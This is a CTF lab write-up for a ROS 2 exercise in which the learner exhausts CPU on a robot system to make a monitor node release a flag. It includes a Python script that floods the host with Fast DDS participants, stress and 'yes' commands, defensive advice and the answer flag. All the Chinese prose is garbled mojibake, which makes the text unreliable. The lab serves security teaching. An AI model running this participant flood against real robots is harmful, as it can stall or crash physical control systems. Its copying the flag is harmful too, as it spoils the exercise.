# ROS 2 CPU è´Ÿè½½æ”»å‡»ï¼ˆLab6)

> **Level 6ï¼šDDS Participant èµ„æºè€—å°½æ”»å‡»**

> æ”»å‡»ç›®æ ‡ï¼šé€šè¿‡å¤šæ¬¡è°ƒç”¨ `create_participant()` å®žçŽ° CPU æ€»å ç”¨è¾¾åˆ° 50%ï¼Œè§¦å‘ CPU ç›‘æŽ§èŠ‚ç‚¹è¾“å‡º Flagã€‚

---

# 1. é¶åœºèƒŒæ™¯

æ­¤æ¬¡æ¸—é€æµ‹è¯•çš„ç›®æ ‡ä¸º **Quiksand Lab6** çŽ¯å¢ƒï¼Œæ ¸å¿ƒå›´ç»• ROS 2 ç³»ç»Ÿçš„ CPU è´Ÿè½½æ”»å‡»æ¼æ´žå±•å¼€ã€‚

åœ¨é»˜è®¤é…ç½®ä¸‹ï¼š

- ç³»ç»Ÿè¿è¡Œ CPU ç›‘æŽ§èŠ‚ç‚¹ï¼Œå½“æ£€æµ‹åˆ° CPU ä½¿ç”¨çŽ‡è¶…è¿‡ 50% æ—¶è¾“å‡º Flag
- ROS 2 èŠ‚ç‚¹åŸºäºŽ DDS åè®®é€šä¿¡ï¼ŒçŽ¯å¢ƒå˜é‡é…ç½®ä¸º ROS_DOMAIN_ID=30
- æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘½ä»¤è¡Œæˆ–åˆ›å»ºèŠ‚ç‚¹çš„æ–¹å¼å¢žåŠ ç³»ç»Ÿ CPU è´Ÿè½½

è¿™æ„å‘³ç€ï¼š

> **ä»»ä½•èƒ½å¢žåŠ ç³»ç»Ÿ CPU è´Ÿè½½çš„æ“ä½œï¼Œéƒ½å¯èƒ½è§¦å‘ CPU ç›‘æŽ§èŠ‚ç‚¹è¾“å‡º Flagã€‚**

åœ¨çœŸå®žæœºå™¨äººç³»ç»Ÿä¸­ï¼Œå¦‚æžœ CPU èµ„æºè¢«æ¶æ„æ¶ˆè€—ï¼Œå°†å¯¼è‡´æœºå™¨äººæŽ§åˆ¶å“åº”å»¶è¿Ÿã€ä»»åŠ¡æ‰§è¡Œå¤±è´¥ç”šè‡³ç³»ç»Ÿå´©æºƒç­‰é£Žé™©ã€‚

---

# 2. æ”»å‡»åœºæ™¯è¯´æ˜Ž

## 2.1 ç³»ç»Ÿè§’è‰²

|è§’è‰²|è¯´æ˜Ž|
|---|---|
|CPU ç›‘æŽ§èŠ‚ç‚¹|ç›®æ ‡èŠ‚ç‚¹ï¼Œè¿è¡ŒäºŽ Docker å®¹å™¨å†…ï¼Œç›‘æŽ§ CPU ä½¿ç”¨çŽ‡ï¼Œè¶…è¿‡ 50% æ—¶è¾“å‡º Flag|
|CPU è´Ÿè½½ç”ŸæˆèŠ‚ç‚¹|è¾…åŠ©èŠ‚ç‚¹ï¼Œé€šè¿‡å¤šæ¬¡è°ƒç”¨ `create_participant()` å¢žåŠ  CPU è´Ÿè½½|
|æ”»å‡»è€…ï¼ˆçº¢é˜Ÿï¼‰|å®¿ä¸»æœº/å®¹å™¨å†…æ”»å‡»è€…ï¼Œé€šè¿‡å„ç§æ–¹å¼å¢žåŠ ç³»ç»Ÿ CPU è´Ÿè½½|
---

## 2.2 æ”»å‡»ç›®æ ‡

- ðŸŽ¯ ç›®æ ‡ï¼šä½¿ç³»ç»Ÿ CPU ä½¿ç”¨çŽ‡è¶…è¿‡ 50%

- ðŸŽ¯ åè®®/å·¥å…·ï¼šDDS åè®®ã€ROS 2 å‘½ä»¤è¡Œå·¥å…·ã€Docker

- ðŸŽ¯ æ•ˆæžœï¼š
        
    - è§¦å‘ CPU ç›‘æŽ§èŠ‚ç‚¹è¾“å‡º Flag
    - éªŒè¯é€šè¿‡ `create_participant()` å®žçŽ° CPU è´Ÿè½½æ”»å‡»çš„å¯è¡Œæ€§
    - äº†è§£ DDS å‚ä¸Žè€…å¯¹ç³»ç»Ÿèµ„æºçš„å½±å“

---

# 3. é¶åœºå¯åŠ¨æ–¹å¼

åœ¨ `lab6` ç›®å½•ä¸‹æž„å»ºå¹¶å¯åŠ¨é¶åœºï¼ˆæŒ‡å®š ROS_DOMAIN_ID=30ï¼‰ï¼š

```bash
docker build -t rctf_lab6 .
docker run -it --name rctf_lab6_container rctf_lab6
```

å¯åŠ¨æˆåŠŸåŽï¼Œå®¹å™¨å†…ä¼šè‡ªåŠ¨ï¼š

- source ROS 2 çŽ¯å¢ƒï¼ŒåŠ è½½ ROS_DOMAIN_ID=30 é…ç½®
- å¯åŠ¨ CPU ç›‘æŽ§èŠ‚ç‚¹ï¼Œå¼€å§‹ç›‘æŽ§ CPU ä½¿ç”¨çŽ‡
- å¯åŠ¨ CPU è´Ÿè½½ç”ŸæˆèŠ‚ç‚¹ï¼Œå°è¯•å°† CPU ä½¿ç”¨çŽ‡æå‡åˆ° 50%
- ç›´æŽ¥è¿›å…¥äº¤äº’ shellï¼Œæç¤ºèŠ‚ç‚¹å¯åŠ¨æˆåŠŸ

---

# 4. åšé¢˜æ€è·¯

## 4.1 æ€è·¯ä¸€ï¼šä½¿ç”¨å†…ç½®çš„ CPU è´Ÿè½½ç”ŸæˆèŠ‚ç‚¹

> æœ€ç›´æŽ¥çš„æ–¹æ³•ï¼Œåˆ©ç”¨å®¹å™¨å†…ç½®çš„ CPU è´Ÿè½½ç”ŸæˆèŠ‚ç‚¹è‡ªåŠ¨å¢žåŠ  CPU è´Ÿè½½ã€‚

### 4.1.1 æ“ä½œæ­¥éª¤

1. **å¯åŠ¨å®¹å™¨**ï¼šæŒ‰ç…§ä¸Šè¿°æ­¥éª¤å¯åŠ¨ lab6 å®¹å™¨

2. **æŸ¥çœ‹èŠ‚ç‚¹çŠ¶æ€**ï¼š
   ```bash
   ros2 topic echo /cpu_load_status
   ```

3. **æŸ¥çœ‹ Flag**ï¼š
   ```bash
   ros2 topic echo /flag
   ```

### 4.1.2 åŽŸç†è¯´æ˜Ž

- CPU è´Ÿè½½ç”ŸæˆèŠ‚ç‚¹é€šè¿‡å¤šæ¬¡è°ƒç”¨ `create_participant()` åˆ›å»º DDS å‚ä¸Žè€…
- æ¯ä¸ªå‚ä¸Žè€…çš„åˆ›å»ºå’Œå‘çŽ°è¿‡ç¨‹éƒ½ä¼šæ¶ˆè€— CPU èµ„æº
- èŠ‚ç‚¹ä¼šè‡ªåŠ¨è°ƒæ•´å‚ä¸Žè€…æ•°é‡ï¼Œç›´åˆ° CPU ä½¿ç”¨çŽ‡è¾¾åˆ°ç›®æ ‡å€¼ï¼ˆ50%ï¼‰
- å½“ CPU ä½¿ç”¨çŽ‡è¶…è¿‡ 50% æ—¶ï¼ŒCPU ç›‘æŽ§èŠ‚ç‚¹ä¼šåœ¨ `/flag` è¯é¢˜ä¸Šå‘å¸ƒ Flag

## 4.2 æ€è·¯äºŒï¼šæ‰‹åŠ¨åˆ›å»º DDS å‚ä¸Žè€…

> æ›´çµæ´»çš„æ–¹æ³•ï¼Œæ‰‹åŠ¨ç¼–å†™ä»£ç åˆ›å»ºå¤šä¸ª DDS å‚ä¸Žè€…æ¥å¢žåŠ  CPU è´Ÿè½½ã€‚

### 4.2.1 æ“ä½œæ­¥éª¤

1. **åˆ›å»ºæµ‹è¯•è„šæœ¬**ï¼š
   ```python
   # participant_flood.py
   from fastdds import dds
   import time

   def create_multiple_participants(count):
       factory = dds.DomainParticipantFactory.get_instance()
       participants = []
       
       print(f"Creating {count} participants...")
       
       for i in range(count):
           try:
               qos = dds.DomainParticipantQos()
               qos.name(f"Participant_{i}")
               participant = factory.create_participant(0, qos)
               
               if participant:
                   participants.append(participant)
                   if (i + 1) % 10 == 0:
                       print(f"Created {i + 1} participants")
           except Exception as e:
               print(f"Error creating participant {i}: {e}")
       
       print(f"Created {len(participants)} participants")
       print("Keeping participants active... Press Ctrl+C to exit")
       
       try:
           while True:
               time.sleep(1)
       except KeyboardInterrupt:
           print("Cleaning up...")
           for participant in participants:
               factory.delete_participant(participant)
           print("Done")

   if __name__ == "__main__":
       create_multiple_participants(200)
   ```

2. **è¿è¡Œè„šæœ¬**ï¼š
   ```bash
   python3 participant_flood.py
   ```

3. **æŸ¥çœ‹ Flag**ï¼š
   ```bash
   ros2 topic echo /flag
   ```

### 4.2.2 åŽŸç†è¯´æ˜Ž

- å¤šæ¬¡è°ƒç”¨ `create_participant()` åˆ›å»ºå¤§é‡ DDS å‚ä¸Žè€…
- æ¯ä¸ªå‚ä¸Žè€…éƒ½ä¼šå‚ä¸Ž DDS å‘çŽ°è¿‡ç¨‹ï¼Œäº§ç”Ÿç½‘ç»œæµé‡å’Œ CPU å¼€é”€
- å¤§é‡å‚ä¸Žè€…ä¼šå¯¼è‡´å‘çŽ°æ¶ˆæ¯é£Žæš´ï¼Œæ˜¾è‘—å¢žåŠ  CPU ä½¿ç”¨çŽ‡
- å½“ CPU ä½¿ç”¨çŽ‡è¶…è¿‡ 50% æ—¶ï¼ŒCPU ç›‘æŽ§èŠ‚ç‚¹ä¼šè¾“å‡º Flag

## 4.3 æ€è·¯ä¸‰ï¼šä½¿ç”¨ç³»ç»Ÿå·¥å…·å¢žåŠ  CPU è´Ÿè½½

> æœ€ç®€å•çš„æ–¹æ³•ï¼Œä½¿ç”¨ç³»ç»Ÿå†…ç½®å·¥å…·ç›´æŽ¥å¢žåŠ  CPU è´Ÿè½½ã€‚

### 4.3.1 æ“ä½œæ­¥éª¤

1. **ä½¿ç”¨ stress å·¥å…·**ï¼š
   ```bash
   # å®‰è£… stress å·¥å…·ï¼ˆå¦‚æžœæœªå®‰è£…ï¼‰
   apt-get update && apt-get install -y stress
   
   # å¯åŠ¨ 2 ä¸ª CPU åŽ‹åŠ›è¿›ç¨‹ï¼Œæ¯ä¸ªä½¿ç”¨ 25% CPU
   stress --cpu 2 --timeout 60
   ```

2. **æˆ–ä½¿ç”¨ yes å‘½ä»¤**ï¼š
   ```bash
   # å¯åŠ¨å¤šä¸ª yes è¿›ç¨‹
   yes > /dev/null &
   yes > /dev/null &
   ```

3. **æŸ¥çœ‹ Flag**ï¼š
   ```bash
   ros2 topic echo /flag
   ```

### 4.3.2 åŽŸç†è¯´æ˜Ž

- ä½¿ç”¨ç³»ç»Ÿå·¥å…·ç›´æŽ¥å ç”¨ CPU èµ„æº
- å½“æ€» CPU ä½¿ç”¨çŽ‡è¶…è¿‡ 50% æ—¶ï¼ŒCPU ç›‘æŽ§èŠ‚ç‚¹ä¼šè¾“å‡º Flag

---

# 5. æ”»å‡»åŽŸç†

## 5.1 DDS Participant èµ„æºæ¶ˆè€—

- **å‘çŽ°è¿‡ç¨‹å¼€é”€**ï¼šæ¯ä¸ªæ–°å‚ä¸Žè€…åŠ å…¥æ—¶ï¼Œä¼šè§¦å‘ DDS å‘çŽ°è¿‡ç¨‹
- **ç½‘ç»œæ´»åŠ¨**ï¼šå‘çŽ°è¿‡ç¨‹åŒ…æ‹¬å‘é€å’Œå¤„ç†å‘çŽ°æ¶ˆæ¯
- **å†…å­˜å ç”¨**ï¼šæ¯ä¸ªå‚ä¸Žè€…ä¼šå ç”¨ä¸€å®šçš„å†…å­˜èµ„æº
- **CPU æ¶ˆè€—**ï¼šå¤„ç†å‘çŽ°æ¶ˆæ¯å’Œç»´æŠ¤å‚ä¸Žè€…çŠ¶æ€ä¼šæŒç»­æ¶ˆè€— CPU

## 5.2 æ”»å‡»æœ¬è´¨

> **ç³»ç»Ÿèµ„æºç®¡ç†ä¸å½“ï¼ŒCPU ä½¿ç”¨çŽ‡ç›‘æŽ§è§¦å‘æ¡ä»¶å¯è¢«å¤–éƒ¨æŽ§åˆ¶**

ä»»ä½•èƒ½å¢žåŠ ç³»ç»Ÿ CPU è´Ÿè½½çš„æ“ä½œï¼Œéƒ½å¯èƒ½è§¦å‘ CPU ç›‘æŽ§èŠ‚ç‚¹è¾“å‡º Flagã€‚è¿™æš´éœ²äº†ç³»ç»Ÿåœ¨èµ„æºç®¡ç†å’Œå®‰å…¨ç›‘æŽ§æ–¹é¢çš„æ½œåœ¨é—®é¢˜ã€‚

---

# 6. é˜²å®ˆæ–¹å‘

è¯¥é¶åœºå¯ç”¨äºŽéªŒè¯ä»¥ä¸‹é˜²å¾¡æŽªæ–½ï¼ŒåŠ å›º ROS 2 èŠ‚ç‚¹å®‰å…¨ï¼ŒæŠµå¾¡ CPU è´Ÿè½½æ”»å‡»ï¼š

- **èµ„æºé™åˆ¶**ï¼šä¸ºå®¹å™¨è®¾ç½® CPU ä½¿ç”¨çŽ‡é™åˆ¶ï¼Œé˜²æ­¢å•ä¸ªå®¹å™¨å ç”¨è¿‡å¤šèµ„æº
- **ç›‘æŽ§ä¼˜åŒ–**ï¼šä¼˜åŒ– CPU ç›‘æŽ§é€»è¾‘ï¼Œå¢žåŠ å¼‚å¸¸æ£€æµ‹å’Œé˜²æŠ¤æœºåˆ¶
- **DDS é…ç½®**ï¼šåˆç†é…ç½® DDS å‚ä¸Žè€…çš„æ•°é‡å’Œèµ„æºä½¿ç”¨
- **å®‰å…¨éš”ç¦»**ï¼šä½¿ç”¨ Docker èµ„æºé™åˆ¶å’Œå‘½åç©ºé—´éš”ç¦»ï¼Œé˜²æ­¢æ”»å‡»æ‰©æ•£
- **è®¿é—®æŽ§åˆ¶**ï¼šé™åˆ¶å¯æ‰§è¡Œçš„å‘½ä»¤å’Œå¯åˆ›å»ºçš„èŠ‚ç‚¹ç±»åž‹

å¼€å¯é˜²å®ˆåŽï¼š

> æ”»å‡»è€…æ— æ³•é€šè¿‡ç®€å•çš„æ–¹æ³•å°† CPU ä½¿ç”¨çŽ‡æå‡åˆ° 50%ï¼ŒCPU ç›‘æŽ§èŠ‚ç‚¹çš„ Flag è¾“å‡ºå°†å—åˆ°ä¿æŠ¤ã€‚

---

# 7. Flag

å½“ CPU ä½¿ç”¨çŽ‡è¶…è¿‡ 50% æ—¶ï¼ŒCPU ç›‘æŽ§èŠ‚ç‚¹ä¼šè¾“å‡ºï¼š

```text
flag{Quiksand_lab6_discovery_leak_006}
```

---

# 8. é€‚ç”¨åœºæ™¯

- ROS 2 å®‰å…¨æ•™å­¦ï¼ˆCPU è´Ÿè½½æ”»å‡»åŽŸç†è®²è§£ï¼‰
- æœºå™¨äººå®‰å…¨å®žéªŒï¼ˆèµ„æºç®¡ç†é˜²æŠ¤æŽªæ–½éªŒè¯ï¼‰
- CTF æ”»é˜²é¶åœºï¼ˆROS 2 ä¸“é¡¹é¢˜åž‹è®¾è®¡ï¼‰
- ç ”ç©¶ç”Ÿ/æœ¬ç§‘è¯¾ç¨‹å®žéªŒï¼ˆåµŒå…¥å¼/æœºå™¨äººå®‰å…¨æ–¹å‘ï¼‰

---

**Author**: ROS 2 Security Lab

**Level**: Intermediate / Offensive
> 